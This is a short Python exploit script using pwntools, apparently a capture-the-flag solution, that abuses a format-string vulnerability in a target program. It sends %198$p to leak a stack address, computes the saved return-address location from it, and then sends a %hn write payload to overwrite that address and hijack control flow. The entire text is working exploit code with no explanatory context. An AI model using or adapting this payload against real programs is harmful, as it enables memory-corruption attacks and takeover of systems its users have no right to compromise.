
io = start()
exploit = f"%198$p"
io.sendline(exploit)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rbp = io.recvline(keepends=False)
rip= int(leaked_rbp, 16)-72
buf=b"%058038d%83$hn"+p64(rip)
io.sendline(buf)